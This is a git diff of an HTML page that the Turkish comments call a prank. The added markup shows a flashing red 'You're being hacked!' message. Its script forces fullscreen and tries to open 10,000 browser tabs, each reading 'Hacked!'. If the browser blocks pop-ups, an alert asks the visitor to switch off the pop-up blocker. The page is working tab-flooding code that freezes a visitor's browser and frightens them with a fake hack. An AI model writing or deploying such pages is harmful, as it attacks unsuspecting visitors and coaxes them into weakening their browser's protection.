@@ -3,7 +3,67 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>snexyh1ckpc</title>
+  <title>Hacked!</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: black;
+      color: red;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    h1 {
+      font-size: 70px;
+      margin-top: 20%;
+      animation: glitch 1.5s infinite;
+    }
+
+    @keyframes glitch {
+      0% { text-shadow: 2px 2px #ff0000; }
+      25% { text-shadow: -2px -2px #00ff00; }
+      50% { text-shadow: 2px -2px #0000ff; }
+      75% { text-shadow: -2px 2px #ff0000; }
+      100% { text-shadow: 2px 2px #00ff00; }
+    }
+  </style>
+</head>
+<body>
+  <h1 id="mainText">You're being hacked!</h1>
+
+  <script>
+    // Tam ekranı açma
+    function goFullScreen() {
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+      } else if (document.documentElement.mozRequestFullScreen) { /* Firefox */
+        document.documentElement.mozRequestFullScreen();
+      } else if (document.documentElement.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
+        document.documentElement.webkitRequestFullscreen();
+      } else if (document.documentElement.msRequestFullscreen) { /* IE/Edge */
+        document.documentElement.msRequestFullscreen();
+      }
+    }
+
+    // 10000 sekme açma ve her sekmede "Hacked!" yazma
+    function openTabs() {
+      for (let i = 0; i < 10000; i++) {
+        let newTab = window.open('', '_blank');
+        if (newTab) {
+          newTab.document.write('<h1 style="color: red; text-align: center;">Hacked!</h1>');
+        } else {
+          // Eğer sekme açılamazsa uyarı ver
+          alert("Tarayıcı sekme açmayı engelledi! Lütfen pop-up'ları engellemeyi devre dışı bırakın.");
+          break;
+        }
+      }
+    }
+
+    // Şakayı başlat
+    goFullScreen();
+    openTabs();
   </script>
 </body>
 </html>
